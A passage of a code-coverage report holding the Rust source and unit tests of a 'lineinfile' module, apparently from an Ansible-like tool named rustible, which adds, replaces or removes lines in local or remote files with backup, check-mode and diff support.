"line":143,"address":[29971532],"length":1,"stats":{"Line":0}},{"line":144,"address":[29971697,29971608],"length":1,"stats":{"Line":0}},{"line":146,"address":[29972079,29972263],"length":1,"stats":{"Line":0}},{"line":147,"address":[29972270],"length":1,"stats":{"Line":0}},{"line":149,"address":[29972094],"length":1,"stats":{"Line":0}},{"line":154,"address":[29976355,29976310,29974256],"length":1,"stats":{"Line":0}},{"line":160,"address":[29974321,29974683,29974556],"length":1,"stats":{"Line":0}},{"line":161,"address":[31021200,31021225],"length":1,"stats":{"Line":0}},{"line":163,"address":[29974833],"length":1,"stats":{"Line":0}},{"line":164,"address":[29974905,29976350,29974851],"length":1,"stats":{"Line":0}},{"line":166,"address":[29975129],"length":1,"stats":{"Line":0}},{"line":167,"address":[29975152,29975351],"length":1,"stats":{"Line":0}},{"line":168,"address":[29975187,29975262],"length":1,"stats":{"Line":0}},{"line":169,"address":[29975289],"length":1,"stats":{"Line":0}},{"line":170,"address":[29975343],"length":1,"stats":{"Line":0}},{"line":174,"address":[29975168],"length":1,"stats":{"Line":0}},{"line":175,"address":[29975361],"length":1,"stats":{"Line":0}},{"line":178,"address":[29975427,29975380],"length":1,"stats":{"Line":0}},{"line":180,"address":[29975454],"length":1,"stats":{"Line":0}},{"line":181,"address":[29975622,29975533],"length":1,"stats":{"Line":0}},{"line":183,"address":[29976004,29976188],"length":1,"stats":{"Line":0}},{"line":184,"address":[29976195],"length":1,"stats":{"Line":0}},{"line":186,"address":[29976019],"length":1,"stats":{"Line":0}},{"line":191,"address":[29973454,29973473,29972416],"length":1,"stats":{"Line":0}},{"line":196,"address":[29972501],"length":1,"stats":{"Line":0}},{"line":197,"address":[29972719,29972805],"length":1,"stats":{"Line":0}},{"line":199,"address":[29973187,29973371],"length":1,"stats":{"Line":0}},{"line":200,"address":[29973378],"length":1,"stats":{"Line":0}},{"line":202,"address":[29973202],"length":1,"stats":{"Line":0}},{"line":208,"address":[29961312],"length":1,"stats":{"Line":1}},{"line":212,"address":[29958672],"length":1,"stats":{"Line":0}},{"line":216,"address":[29958704],"length":1,"stats":{"Line":1}},{"line":220,"address":[29958720],"length":1,"stats":{"Line":1}},{"line":224,"address":[29968457,29965713,29961776],"length":1,"stats":{"Line":0}},{"line":229,"address":[29961865,29962063],"length":1,"stats":{"Line":0}},{"line":230,"address":[31013407],"length":1,"stats":{"Line":0}},{"line":231,"address":[31013374],"length":1,"stats":{"Line":0}},{"line":235,"address":[29962120],"length":1,"stats":{"Line":0}},{"line":236,"address":[29968455,29962459,29962543],"length":1,"stats":{"Line":0}},{"line":238,"address":[29962600],"length":1,"stats":{"Line":0}},{"line":239,"address":[29962638,29962729,29968431],"length":1,"stats":{"Line":0}},{"line":241,"address":[29962890,29968426],"length":1,"stats":{"Line":0}},{"line":242,"address":[29963078],"length":1,"stats":{"Line":0}},{"line":244,"address":[29963130,29968421],"length":1,"stats":{"Line":0}},{"line":246,"address":[29963356],"length":1,"stats":{"Line":0}},{"line":248,"address":[29963376],"length":1,"stats":{"Line":0}},{"line":249,"address":[29967660,29967607],"length":1,"stats":{"Line":0}},{"line":252,"address":[29967642],"length":1,"stats":{"Line":0}},{"line":253,"address":[29967847,29968267],"length":1,"stats":{"Line":0}},{"line":259,"address":[29967911,29967822,29968262],"length":1,"stats":{"Line":0}},{"line":260,"address":[29968051],"length":1,"stats":{"Line":0}},{"line":264,"address":[29963389],"length":1,"stats":{"Line":0}},{"line":265,"address":[29963397],"length":1,"stats":{"Line":0}},{"line":267,"address":[29963423],"length":1,"stats":{"Line":0}},{"line":268,"address":[29963437],"length":1,"stats":{"Line":0}},{"line":269,"address":[29964029,29963513],"length":1,"stats":{"Line":0}},{"line":275,"address":[29963627,29964005,29963482],"length":1,"stats":{"Line":0}},{"line":276,"address":[29963799],"length":1,"stats":{"Line":0}},{"line":277,"address":[29963815],"length":1,"stats":{"Line":0}},{"line":280,"address":[29963456],"length":1,"stats":{"Line":0}},{"line":282,"address":[29964211,29966801],"length":1,"stats":{"Line":0}},{"line":283,"address":[29966827,29967418,29966916],"length":1,"stats":{"Line":0}},{"line":286,"address":[29967145],"length":1,"stats":{"Line":0}},{"line":287,"address":[29967247,29967180],"length":1,"stats":{"Line":0}},{"line":294,"address":[29966852,29967423],"length":1,"stats":{"Line":0}},{"line":300,"address":[29964264,29966796,29964191],"length":1,"stats":{"Line":0}},{"line":303,"address":[29964445],"length":1,"stats":{"Line":0}},{"line":304,"address":[29964454],"length":1,"stats":{"Line":0}},{"line":305,"address":[29964470],"length":1,"stats":{"Line":0}},{"line":310,"address":[29963979,29964669],"length":1,"stats":{"Line":0}},{"line":311,"address":[29964937],"length":1,"stats":{"Line":0}},{"line":313,"address":[29965022],"length":1,"stats":{"Line":0}},{"line":314,"address":[29965139,29965236,29965719,29965267],"length":1,"stats":{"Line":0}},{"line":315,"address":[29965691,29965417,29965479],"length":1,"stats":{"Line":0}},{"line":318,"address":[29965170,29965745],"length":1,"stats":{"Line":0}},{"line":319,"address":[29965788,29965875],"length":1,"stats":{"Line":0}},{"line":321,"address":[29965751,29965825],"length":1,"stats":{"Line":0}},{"line":324,"address":[29965859,29966186],"length":1,"stats":{"Line":0}},{"line":325,"address":[29966032,29966178],"length":1,"stats":{"Line":0}},{"line":327,"address":[29966087,29965977],"length":1,"stats":{"Line":0}},{"line":330,"address":[29966323,29966095,29966229,29966706],"length":1,"stats":{"Line":0}},{"line":331,"address":[29966428,29966672],"length":1,"stats":{"Line":0}},{"line":334,"address":[29966529],"length":1,"stats":{"Line":0}},{"line":339,"address":[29961744,29961750,29961344],"length":1,"stats":{"Line":0}},{"line":344,"address":[29961680],"length":1,"stats":{"Line":0}},{"line":347,"address":[29958752,29960473,29961284],"length":1,"stats":{"Line":0}},{"line":348,"address":[29958811],"length":1,"stats":{"Line":0}},{"line":349,"address":[29958877],"length":1,"stats":{"Line":0}},{"line":350,"address":[29958988],"length":1,"stats":{"Line":0}},{"line":353,"address":[29958895,29959036],"length":1,"stats":{"Line":0}},{"line":354,"address":[29959359,29961282,29959278],"length":1,"stats":{"Line":0}},{"line":356,"address":[29959416],"length":1,"stats":{"Line":0}},{"line":357,"address":[29959454,29959533,29961261],"length":1,"stats":{"Line":0}},{"line":359,"address":[29959688,29961240],"length":1,"stats":{"Line":0}},{"line":361,"address":[29959914,29960487],"length":1,"stats":{"Line":0}},{"line":362,"address":[29959967,29960138],"length":1,"stats":{"Line":0}},{"line":366,"address":[29959980,29960093],"length":1,"stats":{"Line":0}},{"line":369,"address":[29960479,29960009],"length":1,"stats":{"Line":0}},{"line":372,"address":[29960458],"length":1,"stats":{"Line":0}},{"line":373,"address":[29960803,29960489],"length":1,"stats":{"Line":0}},{"line":375,"address":[29960587,29960801,29960531],"length":1,"stats":{"Line":0}},{"line":377,"address":[29960793,29960628],"length":1,"stats":{"Line":0}},{"line":379,"address":[29960601,29960658],"length":1,"stats":{"Line":0}},{"line":384,"address":[29961016,29960858,29960782],"length":1,"stats":{"Line":0}},{"line":385,"address":[29960980],"length":1,"stats":{"Line":0}},{"line":387,"address":[29960864,29961018],"length":1,"stats":{"Line":0}},{"line":393,"address":[29978945,29978939,29978592],"length":1,"stats":{"Line":1}},{"line":395,"address":[29978676,29978651],"length":1,"stats":{"Line":2}},{"line":396,"address":[29978666],"length":1,"stats":{"Line":3}},{"line":398,"address":[29978777],"length":1,"stats":{"Line":1}},{"line":400,"address":[29978690,29978788],"length":1,"stats":{"Line":1}}],"covered":13,"coverable":156},{"path":["/","home","artur","Repositories","rustible","src","modules","lineinfile.rs"],"content":"//! Line-in-file module - Manage lines in text files\n//!\n//! This module ensures a particular line is in a file, or replaces an existing\n//! line using a back-referenced regular expression.\n//!\n//! Supports both local and remote execution:\n//! - Local: Uses native Rust std::fs operations\n//! - Remote: Downloads file via connection, edits in memory, uploads back\n\nuse super::{\n    Diff, Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParamExt,\n};\nuse crate::connection::TransferOptions;\nuse regex::Regex;\nuse std::fs;\nuse std::os::unix::fs::PermissionsExt;\nuse std::path::Path;\n\n/// Desired state for a line\n#[derive(Debug, Clone, PartialEq)]\npub enum LineState {\n    Present,\n    Absent,\n}\n\nimpl LineState {\n    fn from_str(s: \u0026str) -\u003e ModuleResult\u003cSelf\u003e {\n        match s.to_lowercase().as_str() {\n            \"present\" =\u003e Ok(LineState::Present),\n            \"absent\" =\u003e Ok(LineState::Absent),\n            _ =\u003e Err(ModuleError::InvalidParameter(format!(\n                \"Invalid state '{}'. Valid states: present, absent\",\n                s\n            ))),\n        }\n    }\n}\n\n/// Where to insert a new line\n#[derive(Debug, Clone, PartialEq)]\npub enum InsertPosition {\n    /// After the line matching the regex\n    AfterMatch,\n    /// Before the line matching the regex\n    BeforeMatch,\n    /// At the beginning of file\n    BeginningOfFile,\n    /// At the end of file (default)\n    EndOfFile,\n}\n\n/// Module for line-in-file operations\npub struct LineinfileModule;\n\nimpl LineinfileModule {\n    fn read_file(path: \u0026Path) -\u003e ModuleResult\u003cVec\u003cString\u003e\u003e {\n        if !path.exists() {\n            return Ok(Vec::new());\n        }\n\n        let content = fs::read_to_string(path)?;\n        Ok(content.lines().map(|s| s.to_string()).collect())\n    }\n\n    fn write_file(\n        path: \u0026Path,\n        lines: \u0026[String],\n        create: bool,\n        mode: Option\u003cu32\u003e,\n    ) -\u003e ModuleResult\u003c()\u003e {\n        if !path.exists() \u0026\u0026 !create {\n            return Err(ModuleError::ExecutionFailed(format!(\n                \"File '{}' does not exist and create=false\",\n                path.display()\n            )));\n        }\n\n        // Create parent directories if needed\n        if let Some(parent) = path.parent() {\n            if !parent.exists() {\n                fs::create_dir_all(parent)?;\n            }\n        }\n\n        let content = if lines.is_empty() {\n            String::new()\n        } else {\n            format!(\"{}\\n\", lines.join(\"\\n\"))\n        };\n\n        fs::write(path, content)?;\n\n        if let Some(mode) = mode {\n            fs::set_permissions(path, fs::Permissions::from_mode(mode))?;\n        }\n\n        Ok(())\n    }\n\n    fn create_backup(path: \u0026Path, suffix: \u0026str) -\u003e ModuleResult\u003cOption\u003cString\u003e\u003e {\n        if path.exists() {\n            let backup_path = format!(\"{}{}\", path.display(), suffix);\n            fs::copy(path, \u0026backup_path)?;\n            Ok(Some(backup_path))\n        } else {\n            Ok(None)\n        }\n    }\n\n    fn find_insert_position(\n        lines: \u0026[String],\n        insertafter: Option\u003c\u0026str\u003e,\n        insertbefore: Option\u003c\u0026str\u003e,\n    ) -\u003e ModuleResult\u003c(InsertPosition, Option\u003cusize\u003e)\u003e {\n        if let Some(pattern) = insertafter {\n            match pattern.to_uppercase().as_str() {\n                \"EOF\" =\u003e Ok((InsertPosition::EndOfFile, None)),\n                \"BOF\" =\u003e Ok((InsertPosition::BeginningOfFile, None)),\n                _ =\u003e {\n                    let re = Regex::new(pattern).map_err(|e| {\n                        ModuleError::InvalidParameter(format!(\"Invalid insertafter regex: {}\", e))\n                    })?;\n                    let idx = lines.iter().rposition(|l| re.is_match(l));\n                    Ok((InsertPosition::AfterMatch, idx))\n                }\n            }\n        } else if let Some(pattern) = insertbefore {\n            match pattern.to_uppercase().as_str() {\n                \"EOF\" =\u003e Ok((InsertPosition::EndOfFile, None)),\n                \"BOF\" =\u003e Ok((InsertPosition::BeginningOfFile, None)),\n                _ =\u003e {\n                    let re = Regex::new(pattern).map_err(|e| {\n                        ModuleError::InvalidParameter(format!(\"Invalid insertbefore regex: {}\", e))\n                    })?;\n                    let idx = lines.iter().position(|l| re.is_match(l));\n                    Ok((InsertPosition::BeforeMatch, idx))\n                }\n            }\n        } else {\n            Ok((InsertPosition::EndOfFile, None))\n        }\n    }\n\n    fn ensure_line_present(\n        lines: \u0026mut Vec\u003cString\u003e,\n        line: \u0026str,\n        regexp: Option\u003c\u0026Regex\u003e,\n        insertafter: Option\u003c\u0026str\u003e,\n        insertbefore: Option\u003c\u0026str\u003e,\n        firstmatch: bool,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        // Check if the exact line already exists\n        if lines.iter().any(|l| l == line) {\n            // If using regexp, check if it matches the same line\n            if let Some(re) = regexp {\n                if lines.iter().any(|l| l == line \u0026\u0026 re.is_match(l)) {\n                    return Ok(false);\n                }\n            } else {\n                return Ok(false);\n            }\n        }\n\n        // If we have a regexp, find and replace matching lines\n        if let Some(re) = regexp {\n            let matching_indices: Vec\u003cusize\u003e = lines\n                .iter()\n                .enumerate()\n                .filter(|(_, l)| re.is_match(l))\n                .map(|(i, _)| i)\n                .collect();\n\n            if !matching_indices.is_empty() {\n                if firstmatch {\n                    // Replace only the first match\n                    lines[matching_indices[0]] = line.to_string();\n                } else {\n                    // Replace all matches\n                    for \u0026idx in \u0026matching_indices {\n                        lines[idx] = line.to_string();\n                    }\n                }\n                return Ok(true);\n            }\n        }\n\n        // No match found or no regexp - insert the line\n        let (position, match_idx) = Self::find_insert_position(lines, insertafter, insertbefore)?;\n\n        match position {\n            InsertPosition::BeginningOfFile =\u003e {\n                lines.insert(0, line.to_string());\n            }\n            InsertPosition::EndOfFile =\u003e {\n                lines.push(line.to_string());\n            }\n            InsertPosition::AfterMatch =\u003e {\n                if let Some(idx) = match_idx {\n                    lines.insert(idx + 1, line.to_string());\n                } else {\n                    // Pattern not found - append to end\n                    lines.push(line.to_string());\n                }\n            }\n            InsertPosition::BeforeMatch =\u003e {\n                if let Some(idx) = match_idx {\n                    lines.insert(idx, line.to_string());\n                } else {\n                    // Pattern not found - append to end\n                    lines.push(line.to_string());\n                }\n            }\n        }\n\n        Ok(true)\n    }\n\n    fn ensure_line_absent(\n        lines: \u0026mut Vec\u003cString\u003e,\n        line: Option\u003c\u0026str\u003e,\n        regexp: Option\u003c\u0026Regex\u003e,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        let original_len = lines.len();\n\n        lines.retain(|l| {\n            if let Some(re) = regexp {\n                !re.is_match(l)\n            } else if let Some(line_str) = line {\n                l != line_str\n            } else {\n                true\n            }\n        });\n\n        Ok(lines.len() != original_len)\n    }\n\n    fn apply_backrefs(line: \u0026str, regexp: \u0026Regex, original: \u0026str) -\u003e String {\n        if let Some(captures) = regexp.captures(original) {\n            let mut result = line.to_string();\n\n            // Replace \\1, \\2, etc. with captured groups\n            for i in 0..captures.len() {\n                if let Some(m) = captures.get(i) {\n                    result = result.replace(\u0026format!(\"\\\\{}\", i), m.as_str());\n                }\n            }\n\n            result\n        } else {\n            line.to_string()\n        }\n    }\n\n    /// Execute lineinfile on a remote host via connection\n    ///\n    /// This method downloads the file content from the remote host, performs line edits\n    /// in memory, and uploads the modified content back. This pattern avoids remote\n    /// command execution and works across all connection types (SSH, Docker, etc.).\n    #[allow(clippy::too_many_arguments)]\n    fn execute_remote(\n        context: \u0026ModuleContext,\n        path: \u0026str,\n        state: LineState,\n        line: Option\u003cString\u003e,\n        regexp: Option\u003cRegex\u003e,\n        insertafter: Option\u003cString\u003e,\n        insertbefore: Option\u003cString\u003e,\n        create: bool,\n        backup: bool,\n        backup_suffix: String,\n        firstmatch: bool,\n        backrefs: bool,\n        mode: Option\u003cu32\u003e,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let connection = context.connection.as_ref().ok_or_else(|| {\n            ModuleError::ExecutionFailed(\"No connection available for remote execution\".to_string())\n        })?;\n\n        // Use tokio runtime to execute async operations\n        let rt = tokio::runtime::Runtime::new().map_err(|e| {\n            ModuleError::ExecutionFailed(format!(\"Failed to create runtime: {}\", e))\n        })?;\n\n        let conn = connection.clone();\n        let check_mode = context.check_mode;\n        let diff_mode = context.diff_mode;\n\n        rt.block_on(async move {\n            let remote_path = Path::new(path);\n\n            // Check if file exists on remote\n            let file_exists = conn.path_exists(remote_path).await.unwrap_or(false);\n\n            if !file_exists \u0026\u0026 !create {\n                return Err(ModuleError::ExecutionFailed(format!(\n                    \"File '{}' does not exist and create=false\",\n                    path\n                )));\n            }\n\n            // Download file content (empty if doesn't exist)\n            let content = if file_exists {\n                conn.download_content(remote_path).await.map_err(|e| {\n                    ModuleError::ExecutionFailed(format!(\"Failed to download file: {}\", e))\n                })?\n            } else {\n                Vec::new()\n            };\n\n            // Parse lines from content\n            let content_str = String::from_utf8_lossy(\u0026content);\n            let mut lines: Vec\u003cString\u003e = content_str.lines().map(|s| s.to_string()).collect();\n            let original_lines = lines.clone();\n\n            // Apply changes based on state\n            let changed = match state {\n                LineState::Present =\u003e {\n                    let line_str = line.as_ref().ok_or_else(|| {\n                        ModuleError::MissingParameter(\n                            \"line is required for state=present\".to_string(),\n                        )\n                    })?;\n\n                    // Handle backrefs\n                    let final_line = if backrefs {\n                        if let Some(ref re) = regexp {\n                            // Find the matching line and apply backrefs\n                            let matching_line = lines.iter().find(|l| re.is_match(l));\n                            if let Some(orig) = matching_line {\n                                Self::apply_backrefs(line_str, re, orig)\n                            } else {\n                                // No match - line won't be added when using backrefs\n                                return Ok(ModuleOutput::ok(format!(\n                                    \"No match for regexp in '{}'\",\n                                    path\n                                )));\n                            }\n                        } else {\n                            line_str.clone()\n                        }\n                    } else {\n                        line_str.clone()\n                    };\n\n                    Self::ensure_line_present(\n                        \u0026mut lines,\n                        \u0026final_line,\n                        regexp.as_ref(),\n                        insertafter.as_deref(),\n                        insertbefore.as_deref(),\n                        firstmatch,\n                    )?\n                }\n                LineState::Absent =\u003e {\n                    Self::ensure_line_absent(\u0026mut lines, line.as_deref(), regexp.as_ref())?\n                }\n            };\n\n            if !changed {\n                return Ok(ModuleOutput::ok(format!(\n                    \"File '{}' already has desired content\",\n                    path\n                )));\n            }\n\n            // In check mode, don't actually write\n            if check_mode {\n                let diff = if diff_mode {\n                    Some(Diff::new(original_lines.join(\"\\n\"), lines.join(\"\\n\")))\n                } else {\n                    None\n                };\n\n                let mut output = ModuleOutput::changed(format!(\"Would modify '{}'\", path));\n\n                if let Some(d) = diff {\n                    output = output.with_diff(d);\n                }\n\n                return Ok(output);\n            }\n\n            // Create backup if requested\n            if backup \u0026\u0026 file_exists {\n                let backup_path_str = format!(\"{}{}\", path, backup_suffix);\n                let backup_dest = Path::new(\u0026backup_path_str);\n\n                conn.upload_content(\u0026content, backup_dest, None)\n                    .await\n                    .map_err(|e| {\n                        ModuleError::ExecutionFailed(format!(\"Failed to create backup: {}\", e))\n                    })?;\n            }\n\n            // Prepare new content\n            let new_content = if lines.is_empty() {\n                String::new()\n            } else {\n                format!(\"{}\\n\", lines.join(\"\\n\"))\n            };\n\n            // Build transfer options\n            let mut transfer_opts = TransferOptions::new();\n            if let Some(m) = mode {\n                transfer_opts = transfer_opts.with_mode(m);\n            }\n            transfer_opts = transfer_opts.with_create_dirs();\n\n            // Upload modified content\n            conn.upload_content(new_content.as_bytes(), remote_path, Some(transfer_opts))\n                .await\n                .map_err(|e| {\n                    ModuleError::ExecutionFailed(format!(\"Failed to upload file: {}\", e))\n                })?;\n\n            let mut output = ModuleOutput::changed(format!(\"Modified '{}'\", path));\n\n            if diff_mode {\n                output = output.with_diff(Diff::new(original_lines.join(\"\\n\"), lines.join(\"\\n\")));\n            }\n\n            if backup \u0026\u0026 file_exists {\n                output = output.with_data(\n                    \"backup_file\",\n                    serde_json::json!(format!(\"{}{}\", path, backup_suffix)),\n                );\n            }\n\n            Ok(output)\n        })\n    }\n\n    /// Execute lineinfile locally using filesystem operations\n    #[allow(clippy::too_many_arguments)]\n    fn execute_local(\n        context: \u0026ModuleContext,\n        path_str: \u0026str,\n        state: LineState,\n        line: Option\u003cString\u003e,\n        regexp: Option\u003cRegex\u003e,\n        insertafter: Option\u003cString\u003e,\n        insertbefore: Option\u003cString\u003e,\n        create: bool,\n        backup: bool,\n        backup_suffix: String,\n        firstmatch: bool,\n        backrefs: bool,\n        mode: Option\u003cu32\u003e,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let path = Path::new(path_str);\n\n        // Check if file exists\n        if !path.exists() \u0026\u0026 !create {\n            return Err(ModuleError::ExecutionFailed(format!(\n                \"File '{}' does not exist and create=false\",\n                path_str\n            )));\n        }\n\n        // Read current content\n        let mut lines = Self::read_file(path)?;\n        let original_lines = lines.clone();\n\n        // Apply changes based on state\n        let changed = match state {\n            LineState::Present =\u003e {\n                let line_str = line.as_ref().ok_or_else(|| {\n                    ModuleError::MissingParameter(\"line is required for state=present\".to_string())\n                })?;\n\n                // Handle backrefs\n                let final_line = if backrefs {\n                    if let Some(ref re) = regexp {\n                        // Find the matching line and apply backrefs\n                        let matching_line = lines.iter().find(|l| re.is_match(l));\n                        if let Some(orig) = matching_line {\n                            Self::apply_backrefs(line_str, re, orig)\n                        } else {\n                            // No match - line won't be added when using backrefs\n                            return Ok(ModuleOutput::ok(format!(\n                                \"No match for regexp in '{}'\",\n                                path_str\n                            )));\n                        }\n                    } else {\n                        line_str.clone()\n                    }\n                } else {\n                    line_str.clone()\n                };\n\n                Self::ensure_line_present(\n                    \u0026mut lines,\n                    \u0026final_line,\n                    regexp.as_ref(),\n                    insertafter.as_deref(),\n                    insertbefore.as_deref(),\n                    firstmatch,\n                )?\n            }\n            LineState::Absent =\u003e {\n                Self::ensure_line_absent(\u0026mut lines, line.as_deref(), regexp.as_ref())?\n            }\n        };\n\n        if !changed {\n            return Ok(ModuleOutput::ok(format!(\n                \"File '{}' already has desired content\",\n                path_str\n            )));\n        }\n\n        // In check mode, don't actually write\n        if context.check_mode {\n            let diff = if context.diff_mode {\n                Some(Diff::new(original_lines.join(\"\\n\"), lines.join(\"\\n\")))\n            } else {\n                None\n            };\n\n            let mut output = ModuleOutput::changed(format!(\"Would modify '{}'\", path_str));\n\n            if let Some(d) = diff {\n                output = output.with_diff(d);\n            }\n\n            return Ok(output);\n        }\n\n        // Create backup if requested\n        let backup_file = if backup {\n            Self::create_backup(path, \u0026backup_suffix)?\n        } else {\n            None\n        };\n\n        // Write the file\n        Self::write_file(path, \u0026lines, create, mode)?;\n\n        let mut output = ModuleOutput::changed(format!(\"Modified '{}'\", path_str));\n\n        if let Some(backup_path) = backup_file {\n            output = output.with_data(\"backup_file\", serde_json::json!(backup_path));\n        }\n\n        if context.diff_mode {\n            output = output.with_diff(Diff::new(original_lines.join(\"\\n\"), lines.join(\"\\n\")));\n        }\n\n        Ok(output)\n    }\n}\n\nimpl Module for LineinfileModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"lineinfile\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Ensure a particular line is in a file\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::NativeTransport\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        \u0026[\"path\"]\n    }\n\n    fn validate_params(\u0026self, params: \u0026ModuleParams) -\u003e ModuleResult\u003c()\u003e {\n        let state = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n\n        if state == \"present\" {\n            if params.get(\"line\").is_none() \u0026\u0026 params.get(\"regexp\").is_none() {\n                return Err(ModuleError::MissingParameter(\n                    \"Either 'line' or 'regexp' is required for state=present\".to_string(),\n                ));\n            }\n        } else if state == \"absent\" {\n            if params.get(\"line\").is_none() \u0026\u0026 params.get(\"regexp\").is_none() {\n                return Err(ModuleError::MissingParameter(\n                    \"Either 'line' or 'regexp' is required for state=absent\".to_string(),\n                ));\n            }\n        }\n\n        Ok(())\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let path_str = params.get_string_required(\"path\")?;\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = LineState::from_str(\u0026state_str)?;\n        let line = params.get_string(\"line\")?;\n        let regexp_str = params.get_string(\"regexp\")?;\n        let insertafter = params.get_string(\"insertafter\")?;\n        let insertbefore = params.get_string(\"insertbefore\")?;\n        let create = params.get_bool_or(\"create\", false);\n        let backup = params.get_bool_or(\"backup\", false);\n        let backup_suffix = params\n            .get_string(\"backup_suffix\")?\n            .unwrap_or_else(|| \"~\".to_string());\n        let firstmatch = params.get_bool_or(\"firstmatch\", false);\n        let backrefs = params.get_bool_or(\"backrefs\", false);\n        let mode = params.get_u32(\"mode\")?;\n\n        // Compile regexp if provided\n        let regexp = if let Some(ref re_str) = regexp_str {\n            Some(\n                Regex::new(re_str)\n                    .map_err(|e| ModuleError::InvalidParameter(format!(\"Invalid regexp: {}\", e)))?,\n            )\n        } else {\n            None\n        };\n\n        // Route to remote or local execution based on connection availability\n        if context.connection.is_some() {\n            // Remote execution via connection\n            Self::execute_remote(\n                context,\n                \u0026path_str,\n                state,\n                line,\n                regexp,\n                insertafter,\n                insertbefore,\n                create,\n                backup,\n                backup_suffix,\n                firstmatch,\n                backrefs,\n                mode,\n            )\n        } else {\n            // Local execution using filesystem operations\n            Self::execute_local(\n                context,\n                \u0026path_str,\n                state,\n                line,\n                regexp,\n                insertafter,\n                insertbefore,\n                create,\n                backup,\n                backup_suffix,\n                firstmatch,\n                backrefs,\n                mode,\n            )\n        }\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let check_context = ModuleContext {\n            check_mode: true,\n            ..context.clone()\n        };\n        self.execute(params, \u0026check_context)\n    }\n\n    fn diff(\u0026self, params: \u0026ModuleParams, _context: \u0026ModuleContext) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        let path_str = params.get_string_required(\"path\")?;\n        let path = Path::new(\u0026path_str);\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = LineState::from_str(\u0026state_str)?;\n        let line = params.get_string(\"line\")?;\n        let regexp_str = params.get_string(\"regexp\")?;\n        let insertafter = params.get_string(\"insertafter\")?;\n        let insertbefore = params.get_string(\"insertbefore\")?;\n        let firstmatch = params.get_bool_or(\"firstmatch\", false);\n\n        let regexp = if let Some(ref re_str) = regexp_str {\n            Some(\n                Regex::new(re_str)\n                    .map_err(|e| ModuleError::InvalidParameter(format!(\"Invalid regexp: {}\", e)))?,\n            )\n        } else {\n            None\n        };\n\n        let mut lines = Self::read_file(path)?;\n        let original_lines = lines.clone();\n\n        let changed = match state {\n            LineState::Present =\u003e {\n                if let Some(line_str) = line {\n                    Self::ensure_line_present(\n                        \u0026mut lines,\n                        \u0026line_str,\n                        regexp.as_ref(),\n                        insertafter.as_deref(),\n                        insertbefore.as_deref(),\n                        firstmatch,\n                    )?\n                } else {\n                    false\n                }\n            }\n            LineState::Absent =\u003e {\n                Self::ensure_line_absent(\u0026mut lines, line.as_deref(), regexp.as_ref())?\n            }\n        };\n\n        if changed {\n            Ok(Some(Diff::new(original_lines.join(\"\\n\"), lines.join(\"\\n\"))))\n        } else {\n            Ok(None)\n        }\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::collections::HashMap;\n    use tempfile::TempDir;\n\n    #[test]\n    fn test_lineinfile_add_line() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"test.txt\");\n        fs::write(\u0026path, \"line1\\nline2\\n\").unwrap();\n\n        let module = LineinfileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"line\".to_string(), serde_json::json!(\"line3\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        let content = fs::read_to_string(\u0026path).unwrap();\n        assert!(content.contains(\"line3\"));\n    }\n\n    #[test]\n    fn test_lineinfile_idempotent() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"test.txt\");\n        fs::write(\u0026path, \"line1\\nline2\\nline3\\n\").unwrap();\n\n        let module = LineinfileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"line\".to_string(), serde_json::json!(\"line2\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n    }\n\n    #[test]\n    fn test_lineinfile_regexp_replace() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"test.txt\");\n        fs::write(\u0026path, \"key=old_value\\nother=stuff\\n\").unwrap();\n\n        let module = LineinfileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"regexp\".to_string(), serde_json::json!(\"^key=\"));\n        params.insert(\"line\".to_string(), serde_json::json!(\"key=new_value\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        let content = fs::read_to_string(\u0026path).unwrap();\n        assert!(content.contains(\"key=new_value\"));\n        assert!(!content.contains(\"key=old_value\"));\n    }\n\n    #[test]\n    fn test_lineinfile_absent() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"test.txt\");\n        fs::write(\u0026path, \"line1\\nline2\\nline3\\n\").unwrap();\n\n        let module = LineinfileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"line\".to_string(), serde_json::json!(\"line2\"));\n        params.insert(\"state\".to_string(), serde_json::json!(\"absent\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        let content = fs::read_to_string(\u0026path).unwrap();\n        